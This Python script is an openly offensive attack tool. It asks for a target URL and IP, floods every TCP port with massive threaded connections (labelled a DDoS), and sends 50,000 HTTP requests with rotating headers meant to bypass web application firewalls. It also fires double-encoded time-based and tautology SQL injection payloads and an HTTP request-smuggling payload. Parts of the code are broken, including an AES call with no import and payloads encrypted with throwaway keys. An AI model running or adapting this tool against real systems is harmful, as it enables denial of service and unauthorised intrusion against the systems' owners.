import requests
import random
import socket
import threading
import urllib3
from cryptography.fernet import Fernet
from base64 import b64encode
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Custom banner
def print_banner():
    banner = """
    ──────    _____            __                                  _______                      
   /     |          /  |                                /       \\                     
   $$$$$ |  ______  $$ |   __   ______    ______        $$$$$$$  |  ______    _______ 
      $$ | /      \\ $$ |  /  | /      \\  /      \\       $$ |  $$ | /      \\  /       |
 __   $$ |/$$$$$$  |$$ |_/$$/ /$$$$$$  |/$$$$$$  |      $$ |  $$ |/$$$$$$  |/$$$$$$$/ 
/  |  $$ |$$ |  $$ |$$   $$<  $$    $$ |$$ |  $$ |      $$ |  $$ |$$ |  $$ |$$      \\ 
$$ \\__$$ |$$ \\__$$ |$$$$$$  \\ $$$$$$$$/ $$ |  $$ |      $$ |__$$ |$$ \\__$$ | $$$$$$  |
$$    $$/ $$    $$ | $$ | $$  |$$       |$$ |  $$ |      $$    $$ |$$    $$ | /     $$/ 
 $$$$$$/   $$$$$$/  $$/   $$/  $$$$$$$/ $$ |  $$ |      $$$$$$$/   $$$$$$/  $$$$$$$/  ──────
                                                                                         - IXXI.X7 -
    """
    print(banner)

# Generate random payloads
def generate_payload():
    return ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(10))

# Randomize headers for WAF bypass
def get_random_headers():
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
        'Mozilla/5.0 (Linux; Android 10)',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2 like Mac OS X)'
    ]
    return {
        'User-Agent': random.choice(user_agents),
        'Referer': 'https://www.google.com/',
        'Cookie': 'session_id=' + generate_payload(),
    }

# Bypass WAF by encoding payload multiple times
def double_url_encode(payload):
    return requests.utils.quote(requests.utils.quote(payload))

# Payload encryption to bypass filters
def encrypt_payload(payload):
    key = Fernet.generate_key()
    cipher_suite = Fernet(key)
    return cipher_suite.encrypt(payload.encode())

# Create SQL injection payloads that bypass WAF
def time_based_sql_payload():
    # Time-based payload for blind SQL injection
    payload = "' OR IF(1=1, SLEEP(5), '') AND '1'='1"
    return double_url_encode(payload)

# Example encrypted payload using AES
def aes_encrypt(payload):
    key = b'Sixteen byte key'
    cipher = AES.new(key, AES.MODE_CBC)
    return b64encode(cipher.encrypt(payload.rjust(16)))

# Send HTTP request with encrypted payload and rotating headers
def send_http_request(url):
    urllib3.disable_warnings(InsecureRequestWarning)
    headers = get_random_headers()
    try:
        with requests.Session() as session:
            for _ in range(50000):  # Adjusted to 50,000 requests
                response = session.get(url, headers=headers, verify=False)
                if response.status_code == 200:
                    print("[HTTP Chaos Unleashed]")
                else:
                    print("[HTTP Chaos Failed]")
    except requests.exceptions.RequestException as e:
        print("[Connection Error]:", e)

# Custom blind SQL injection payload for testing
def custom_sql_payload():
    sql_payload = "' OR '1'='1"
    return {'username': sql_payload, 'password': sql_payload}

# Send encrypted SQL injection payload
def send_sql_payload(url):
    headers = get_random_headers()
    data = custom_sql_payload()
    encrypted_data = {key: encrypt_payload(value) for key, value in data.items()}
    try:
        with requests.Session() as session:
            response = session.post(url, headers=headers, data=encrypted_data, verify=False)
            if response.status_code == 200:
                print("[SQL Injection Attempt Sent]")
            else:
                print("[SQL Injection Failed]")
    except requests.exceptions.RequestException as e:
        print("[SQL Connection Error]:", e)

# DDoS attack on multiple ports
def hit_port(target_ip, port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as tcp_socket:
            tcp_socket.settimeout(0.1)
            tcp_socket.connect((target_ip, port))
            tcp_socket.send(encrypt_payload(generate_payload()))
            response = tcp_socket.recv(1024)
            print("[Port Chaos] Port {}: {}".format(port, response))
    except (socket.timeout, ConnectionRefusedError):
        pass

# Unleash chaos on all ports using threading
def unleash_port_chaos(target_ip):
    threads = []
    for port in range(1, 65536):
        for _ in range(50000):  # Adjusted to 50,000 threads
            thread = threading.Thread(target=hit_port, args=(target_ip, port))
            threads.append(thread)
            thread.start()
    for thread in threads:
        thread.join()
    print(f"Port Chaos unleashed on {target_ip}")

# HTTP Smuggling example
def send_smuggling_payload(url):
    headers = {'Transfer-Encoding': 'chunked'}
    payload = "0\r\n\r\nPOST /admin HTTP/1.1\r\nContent-Length: 10\r\n"
    try:
        response = requests.post(url, headers=headers, data=payload)
        print(response.text)
    except Exception as e:
        print(f"Request smuggling failed: {e}")

# Main attack
if __name__ == "__main__":
    print_banner()
    target_url = input("Enter the target URL: ")
    target_ip = input("Enter the target IP: ")

    # Unleash chaos on ports
    unleash_port_chaos(target_ip)

    # Unleash time-based SQL injection
    time_payload = time_based_sql_payload()
    response = requests.post(target_url, data={'input': time_payload})
    print("SQL Injection Response:", response.status_code)
    
    # Send HTTP request smuggling
    send_smuggling_payload(target_url)
